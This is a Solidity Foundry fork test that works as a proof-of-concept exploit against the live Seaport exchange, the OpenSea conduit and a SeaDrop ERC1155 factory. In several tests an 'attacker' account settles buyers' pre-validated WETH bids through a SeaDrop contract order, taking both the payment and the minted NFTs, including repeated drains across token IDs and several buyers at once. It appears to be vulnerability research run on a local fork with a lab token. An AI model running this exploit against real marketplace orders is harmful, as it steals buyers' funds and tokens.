// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

enum ItemType {
    NATIVE,
    ERC20,
    ERC721,
    ERC1155,
    ERC721_WITH_CRITERIA,
    ERC1155_WITH_CRITERIA
}

enum OrderType {
    FULL_OPEN,
    PARTIAL_OPEN,
    FULL_RESTRICTED,
    PARTIAL_RESTRICTED,
    CONTRACT
}

enum Side {
    OFFER,
    CONSIDERATION
}

struct OfferItem {
    ItemType itemType;
    address token;
    uint256 identifierOrCriteria;
    uint256 startAmount;
    uint256 endAmount;
}

struct ConsiderationItem {
    ItemType itemType;
    address token;
    uint256 identifierOrCriteria;
    uint256 startAmount;
    uint256 endAmount;
    address payable recipient;
}

struct OrderParameters {
    address offerer;
    address zone;
    OfferItem[] offer;
    ConsiderationItem[] consideration;
    OrderType orderType;
    uint256 startTime;
    uint256 endTime;
    bytes32 zoneHash;
    uint256 salt;
    bytes32 conduitKey;
    uint256 totalOriginalConsiderationItems;
}

struct Order {
    OrderParameters parameters;
    bytes signature;
}

struct AdvancedOrder {
    OrderParameters parameters;
    uint120 numerator;
    uint120 denominator;
    bytes signature;
    bytes extraData;
}

struct OrderComponents {
    address offerer;
    address zone;
    OfferItem[] offer;
    ConsiderationItem[] consideration;
    OrderType orderType;
    uint256 startTime;
    uint256 endTime;
    bytes32 zoneHash;
    uint256 salt;
    bytes32 conduitKey;
    uint256 counter;
}

struct CriteriaResolver {
    uint256 orderIndex;
    Side side;
    uint256 index;
    uint256 identifier;
    bytes32[] criteriaProof;
}

struct FulfillmentComponent {
    uint256 orderIndex;
    uint256 itemIndex;
}

struct Fulfillment {
    FulfillmentComponent[] offerComponents;
    FulfillmentComponent[] considerationComponents;
}

struct ReceivedItem {
    ItemType itemType;
    address token;
    uint256 identifier;
    uint256 amount;
    address payable recipient;
}

struct Execution {
    ReceivedItem item;
    address offerer;
    bytes32 conduitKey;
}

struct PublicDrop {
    uint80 startPrice;
    uint80 endPrice;
    uint40 startTime;
    uint40 endTime;
    bool restrictFeeRecipients;
    address paymentToken;
    uint24 fromTokenId;
    uint24 toTokenId;
    uint16 maxTotalMintableByWallet;
    uint16 maxTotalMintableByWalletPerToken;
    uint16 feeBps;
}

interface ISeaport {
    function validate(Order[] calldata orders) external returns (bool validated);

    function matchAdvancedOrders(
        AdvancedOrder[] calldata advancedOrders,
        CriteriaResolver[] calldata criteriaResolvers,
        Fulfillment[] calldata fulfillments,
        address recipient
    ) external payable returns (Execution[] memory executions);

    function getOrderHash(OrderComponents calldata order)
        external
        view
        returns (bytes32 orderHash);

    function getCounter(address offerer) external view returns (uint256 counter);

    function getOrderStatus(bytes32 orderHash)
        external
        view
        returns (
            bool isValidated,
            bool isCancelled,
            uint256 totalFilled,
            uint256 totalSize
        );

    function information()
        external
        view
        returns (string memory version, bytes32 domainSeparator, address controller);
}

interface IERC1155SeaDropFactory {
    function seaport() external view returns (address);
    function configurer() external view returns (address);
    function cloneableImplementation() external view returns (address);
    function createClone(string calldata name, string calldata symbol, bytes32 salt)
        external
        returns (address instance);
}

interface IERC1155View {
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function owner() external view returns (address);
}

interface IConduitController {
    function getConduit(bytes32 conduitKey)
        external
        view
        returns (address conduit, bool exists);
}

interface IConduit {
    function getChannelStatus(address channel) external view returns (bool isOpen);
}

contract LabWETH {
    string public constant name = "Lab WETH";
    string public constant symbol = "LWETH";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount)
        external
        returns (bool)
    {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        require(balanceOf[from] >= amount, "BALANCE");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract OfficialFactoryForkTest is Test {
    address internal constant SEAPORT =
        0x0000000000000068F116a894984e2DB1123eB395;
    address internal constant CONTROLLER =
        0x00000000F9490004C11Cef243f5400493c00Ad63;
    address internal constant OPENSEA_CONDUIT =
        0x1e0049783f008a0085193e00003d00cd54003c71;

    bytes32 internal constant OPENSEA_CONDUIT_KEY =
        0x0000007b02230091a7c22b5bb0c9e86cdd3c13d1000000000000000000000000;
    bytes32 internal constant SEAPORT_RUNTIME_HASH =
        0x74499ac0cce14428e4b41541d5e44f28f5a6882a1051d0118867c2a93cd5aec0;

    uint256 internal constant PRICE = 1_000 ether;
    uint256 internal constant FIRST_ID = 101;
    uint256 internal constant BUYER_KEY = 0xB0B123456789;

    ISeaport internal constant seaport = ISeaport(SEAPORT);
    address internal factory;
    address internal clone;
    address internal implementation;
    address internal configurer;
    address internal buyer;
    address internal attacker = address(0xA77AC);
    LabWETH internal weth;

    event DeploymentFingerprint(
        uint256 chainId,
        uint256 forkBlock,
        address factory,
        address implementation,
        address configurer,
        bytes32 seaportCodeHash,
        bytes32 factoryCodeHash,
        bytes32 implementationCodeHash,
        bytes32 cloneCodeHash,
        bytes32 conduitCodeHash
    );

    event AuthorizationDelta(
        address buyer,
        uint256 tokenId,
        uint256 authorizedWethConditional,
        uint256 actualWethLoss,
        uint256 requiredNftReceipt,
        uint256 actualNftReceipt,
        uint256 attackerWethGain,
        uint256 attackerNftGain,
        bool validated,
        bool cancelled,
        uint256 filled,
        uint256 size
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), vm.envUint("FORK_BLOCK"));
        factory = vm.envAddress("SEADROP_FACTORY");

        assertEq(keccak256(SEAPORT.code), SEAPORT_RUNTIME_HASH, "Seaport runtime");
        assertGt(CONTROLLER.code.length, 0, "controller missing");
        assertGt(OPENSEA_CONDUIT.code.length, 0, "conduit missing");
        assertEq(IERC1155SeaDropFactory(factory).seaport(), SEAPORT, "factory Seaport");

        (address derivedConduit, bool conduitExists) =
            IConduitController(CONTROLLER).getConduit(OPENSEA_CONDUIT_KEY);
        assertTrue(conduitExists, "conduit key absent");
        assertEq(derivedConduit, OPENSEA_CONDUIT, "conduit key mismatch");
        assertTrue(IConduit(OPENSEA_CONDUIT).getChannelStatus(SEAPORT), "Seaport channel closed");

        implementation = IERC1155SeaDropFactory(factory).cloneableImplementation();
        configurer = IERC1155SeaDropFactory(factory).configurer();
        assertGt(implementation.code.length, 0, "implementation missing");
        assertGt(configurer.code.length, 0, "configurer missing");

        buyer = vm.addr(BUYER_KEY);
        weth = new LabWETH();

        vm.prank(attacker);
        clone = IERC1155SeaDropFactory(factory).createClone(
            "Official SeaDrop Gold Lab",
            "OSGL",
            keccak256(abi.encode(block.chainid, block.number, attacker))
        );
        assertGt(clone.code.length, 0, "clone missing");
        assertEq(IERC1155View(clone).owner(), attacker, "clone owner");

        _configurePublicDrop(FIRST_ID, FIRST_ID + 32);

        weth.mint(buyer, PRICE * 32);
        vm.prank(buyer);
        weth.approve(OPENSEA_CONDUIT, type(uint256).max);

        emit DeploymentFingerprint(
            block.chainid,
            block.number,
            factory,
            implementation,
            configurer,
            keccak256(SEAPORT.code),
            keccak256(factory.code),
            keccak256(implementation.code),
            keccak256(clone.code),
            keccak256(OPENSEA_CONDUIT.code)
        );
    }

    function testArbitraryOutsiderSettlesExactBidWithoutNftDelivery() public {
        Order memory buyerOrder = _exactBuyerOrder(buyer, FIRST_ID, 0xE001);
        bytes32 orderHash = _selfValidate(buyerOrder, buyer);

        uint256 buyerWethBefore = weth.balanceOf(buyer);
        uint256 attackerWethBefore = weth.balanceOf(attacker);
        uint256 buyerNftBefore = IERC1155View(clone).balanceOf(buyer, FIRST_ID);
        uint256 attackerNftBefore = IERC1155View(clone).balanceOf(attacker, FIRST_ID);

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(buyerOrder.parameters, 1, 1, bytes(""), bytes(""));
        advanced[1] = _seaDropOrder(_oneId(FIRST_ID), address(0));

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _singleFulfillment(1, 0, 0, 0),
            attacker
        );

        uint256 buyerWethAfter = weth.balanceOf(buyer);
        uint256 attackerWethAfter = weth.balanceOf(attacker);
        uint256 buyerNftAfter = IERC1155View(clone).balanceOf(buyer, FIRST_ID);
        uint256 attackerNftAfter = IERC1155View(clone).balanceOf(attacker, FIRST_ID);
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);

        emit AuthorizationDelta(
            buyer,
            FIRST_ID,
            PRICE,
            buyerWethBefore - buyerWethAfter,
            1,
            buyerNftAfter - buyerNftBefore,
            attackerWethAfter - attackerWethBefore,
            attackerNftAfter - attackerNftBefore,
            validated,
            cancelled,
            filled,
            size
        );

        assertEq(buyerWethAfter, buyerWethBefore - PRICE, "buyer WETH debit");
        assertEq(attackerWethAfter, attackerWethBefore + PRICE, "attacker WETH gain");
        assertEq(buyerNftAfter, buyerNftBefore, "buyer received NFT");
        assertEq(attackerNftAfter, attackerNftBefore + 1, "attacker NFT gain");
        assertTrue(validated);
        assertFalse(cancelled);
        assertEq(filled, 1);
        assertEq(size, 1);
    }

    function testCollectionWidePartialBidIsRepeatablyDrainedAcrossIds() public {
        uint256 units = 4;
        Order memory buyerOrder = _criteriaBuyerOrder(buyer, units, 0xE002);
        bytes32 orderHash = _selfValidate(buyerOrder, buyer);
        uint256 buyerWethBefore = weth.balanceOf(buyer);
        uint256 attackerWethBefore = weth.balanceOf(attacker);

        for (uint256 i; i < units; ++i) {
            uint256 id = FIRST_ID + i;
            AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
            advanced[0] = AdvancedOrder(
                buyerOrder.parameters,
                1,
                uint120(units),
                bytes(""),
                bytes("")
            );
            advanced[1] = _seaDropOrder(_oneId(id), address(0));

            CriteriaResolver[] memory resolvers = new CriteriaResolver[](1);
            resolvers[0] = CriteriaResolver(
                0,
                Side.CONSIDERATION,
                0,
                id,
                new bytes32[](0)
            );

            vm.prank(attacker);
            seaport.matchAdvancedOrders(
                advanced,
                resolvers,
                _singleFulfillment(1, 0, 0, 0),
                attacker
            );

            assertEq(IERC1155View(clone).balanceOf(buyer, id), 0, "buyer NFT");
            assertEq(IERC1155View(clone).balanceOf(attacker, id), 1, "attacker NFT");
        }

        assertEq(weth.balanceOf(buyer), buyerWethBefore - PRICE * units, "buyer drain");
        assertEq(weth.balanceOf(attacker), attackerWethBefore + PRICE * units, "attacker gain");
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);
        assertTrue(validated);
        assertFalse(cancelled);
        assertEq(filled, units);
        assertEq(size, units);
    }

    function testOneContractOrderFansOutAcrossThreeIndependentBuyers() public {
        uint256 count = 3;
        AdvancedOrder[] memory advanced = new AdvancedOrder[](count + 1);
        Fulfillment[] memory fulfillments = new Fulfillment[](count);
        uint256[] memory ids = new uint256[](count);
        address[] memory buyers = new address[](count);
        bytes32[] memory hashes = new bytes32[](count);

        for (uint256 i; i < count; ++i) {
            ids[i] = FIRST_ID + 10 + i;
            buyers[i] = vm.addr(0xC001 + i);
            weth.mint(buyers[i], PRICE);
            vm.prank(buyers[i]);
            weth.approve(OPENSEA_CONDUIT, type(uint256).max);

            Order memory order = _exactBuyerOrder(buyers[i], ids[i], 0xF000 + i);
            hashes[i] = _selfValidate(order, buyers[i]);
            advanced[i] = AdvancedOrder(order.parameters, 1, 1, bytes(""), bytes(""));
            fulfillments[i] = _singleFulfillment(count, i, i, 0)[0];
        }
        advanced[count] = _seaDropOrder(ids, address(0));

        uint256 attackerWethBefore = weth.balanceOf(attacker);
        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            fulfillments,
            attacker
        );

        assertEq(weth.balanceOf(attacker), attackerWethBefore + PRICE * count);
        for (uint256 i; i < count; ++i) {
            assertEq(weth.balanceOf(buyers[i]), 0, "buyer WETH remains");
            assertEq(IERC1155View(clone).balanceOf(buyers[i], ids[i]), 0, "buyer NFT");
            assertEq(IERC1155View(clone).balanceOf(attacker, ids[i]), 1, "attacker NFT");
            (bool validated, bool cancelled, uint256 filled, uint256 size) =
                seaport.getOrderStatus(hashes[i]);
            assertTrue(validated);
            assertFalse(cancelled);
            assertEq(filled, 1);
            assertEq(size, 1);
        }
    }

    function testExplicitBuyerMinterIsSafeControl() public {
        Order memory buyerOrder = _exactBuyerOrder(buyer, FIRST_ID, 0xE003);
        _selfValidate(buyerOrder, buyer);

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(buyerOrder.parameters, 1, 1, bytes(""), bytes(""));
        advanced[1] = _seaDropOrder(_oneId(FIRST_ID), buyer);

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _singleFulfillment(1, 0, 0, 0),
            attacker
        );

        assertEq(IERC1155View(clone).balanceOf(buyer, FIRST_ID), 1);
        assertEq(IERC1155View(clone).balanceOf(attacker, FIRST_ID), 0);
    }

    function testWithoutBuyerValidationEverythingRollsBack() public {
        Order memory buyerOrder = _exactBuyerOrder(buyer, FIRST_ID, 0xE004);
        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(buyerOrder.parameters, 1, 1, bytes(""), bytes(""));
        advanced[1] = _seaDropOrder(_oneId(FIRST_ID), address(0));

        uint256 buyerWethBefore = weth.balanceOf(buyer);
        vm.prank(attacker);
        vm.expectRevert();
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _singleFulfillment(1, 0, 0, 0),
            attacker
        );

        assertEq(weth.balanceOf(buyer), buyerWethBefore);
        assertEq(weth.balanceOf(attacker), 0);
        assertEq(IERC1155View(clone).balanceOf(attacker, FIRST_ID), 0);
    }

    function _selfValidate(Order memory order, address offerer)
        internal
        returns (bytes32 orderHash)
    {
        Order[] memory orders = new Order[](1);
        orders[0] = order;
        vm.prank(offerer);
        assertTrue(seaport.validate(orders));
        orderHash = _hash(order.parameters);
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);
        assertTrue(validated);
        assertFalse(cancelled);
        assertEq(filled, 0);
        assertEq(size, 0);
    }

    function _exactBuyerOrder(address offerer, uint256 id, uint256 salt)
        internal
        view
        returns (Order memory order)
    {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem(ItemType.ERC20, address(weth), 0, PRICE, PRICE);
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem(
            ItemType.ERC1155,
            clone,
            id,
            1,
            1,
            payable(offerer)
        );
        order = Order(
            OrderParameters(
                offerer,
                address(0),
                offer,
                consideration,
                OrderType.FULL_OPEN,
                0,
                type(uint256).max,
                bytes32(0),
                salt,
                OPENSEA_CONDUIT_KEY,
                1
            ),
            bytes("")
        );
    }

    function _criteriaBuyerOrder(address offerer, uint256 units, uint256 salt)
        internal
        view
        returns (Order memory order)
    {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem(
            ItemType.ERC20,
            address(weth),
            0,
            PRICE * units,
            PRICE * units
        );
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem(
            ItemType.ERC1155_WITH_CRITERIA,
            clone,
            0,
            units,
            units,
            payable(offerer)
        );
        order = Order(
            OrderParameters(
                offerer,
                address(0),
                offer,
                consideration,
                OrderType.PARTIAL_OPEN,
                0,
                type(uint256).max,
                bytes32(0),
                salt,
                OPENSEA_CONDUIT_KEY,
                1
            ),
            bytes("")
        );
    }

    function _seaDropOrder(uint256[] memory ids, address explicitMinter)
        internal
        view
        returns (AdvancedOrder memory advanced)
    {
        OfferItem[] memory offer = new OfferItem[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            offer[i] = OfferItem(ItemType.ERC1155, clone, ids[i], 1, 1);
        }
        advanced = AdvancedOrder(
            OrderParameters(
                clone,
                address(0),
                offer,
                new ConsiderationItem[](0),
                OrderType.CONTRACT,
                0,
                type(uint256).max,
                bytes32(0),
                0,
                OPENSEA_CONDUIT_KEY,
                0
            ),
            1,
            1,
            bytes(""),
            _context(explicitMinter)
        );
    }

    function _context(address minter) internal view returns (bytes memory context) {
        context = new bytes(74);
        context[0] = bytes1(uint8(0));
        context[1] = bytes1(uint8(0));
        _writeAddress(context, 2, attacker);
        _writeAddress(context, 22, minter);
    }

    function _singleFulfillment(
        uint256 contractOrderIndex,
        uint256 contractItemIndex,
        uint256 buyerOrderIndex,
        uint256 buyerItemIndex
    ) internal pure returns (Fulfillment[] memory fulfillments) {
        fulfillments = new Fulfillment[](1);
        FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);
        offerComponents[0] = FulfillmentComponent(contractOrderIndex, contractItemIndex);
        FulfillmentComponent[] memory considerationComponents =
            new FulfillmentComponent[](1);
        considerationComponents[0] = FulfillmentComponent(buyerOrderIndex, buyerItemIndex);
        fulfillments[0] = Fulfillment(offerComponents, considerationComponents);
    }

    function _oneId(uint256 id) internal pure returns (uint256[] memory ids) {
        ids = new uint256[](1);
        ids[0] = id;
    }

    function _configurePublicDrop(uint256 fromId, uint256 toId) internal {
        for (uint256 id = fromId; id <= toId; ++id) {
            vm.prank(attacker);
            (bool maxOk, bytes memory maxData) = clone.call(
                abi.encodeWithSignature(
                    "setMaxSupply(uint256,uint256)", id, uint256(1_000_000)
                )
            );
            if (!maxOk) _bubble(maxData);
        }

        PublicDrop memory drop = PublicDrop({
            startPrice: 0,
            endPrice: 0,
            startTime: uint40(block.timestamp),
            endTime: type(uint40).max,
            restrictFeeRecipients: false,
            paymentToken: address(0),
            fromTokenId: uint24(fromId),
            toTokenId: uint24(toId),
            maxTotalMintableByWallet: type(uint16).max,
            maxTotalMintableByWalletPerToken: type(uint16).max,
            feeBps: 0
        });

        vm.prank(attacker);
        (bool okA, bytes memory dataA) = clone.call(
            abi.encodeWithSignature(
                "updatePublicDrop((uint80,uint80,uint40,uint40,bool,address,uint24,uint24,uint16,uint16,uint16),uint256)",
                drop,
                uint256(0)
            )
        );
        if (!okA) {
            vm.prank(attacker);
            (bool okB, bytes memory dataB) = clone.call(
                abi.encodeWithSignature(
                    "updatePublicDrop(uint256,(uint80,uint80,uint40,uint40,bool,address,uint24,uint24,uint16,uint16,uint16))",
                    uint256(0),
                    drop
                )
            );
            if (!okB) {
                if (dataA.length != 0) _bubble(dataA);
                _bubble(dataB);
            }
        }
    }

    function _writeAddress(bytes memory target, uint256 offset, address value)
        internal
        pure
    {
        assembly {
            mstore(add(add(target, 0x20), offset), shl(96, value))
        }
    }

    function _hash(OrderParameters memory params) internal view returns (bytes32) {
        return seaport.getOrderHash(
            OrderComponents(
                params.offerer,
                params.zone,
                params.offer,
                params.consideration,
                params.orderType,
                params.startTime,
                params.endTime,
                params.zoneHash,
                params.salt,
                params.conduitKey,
                seaport.getCounter(params.offerer)
            )
        );
    }

    function _bubble(bytes memory data) internal pure {
        assembly {
            revert(add(data, 0x20), mload(data))
        }
    }
}
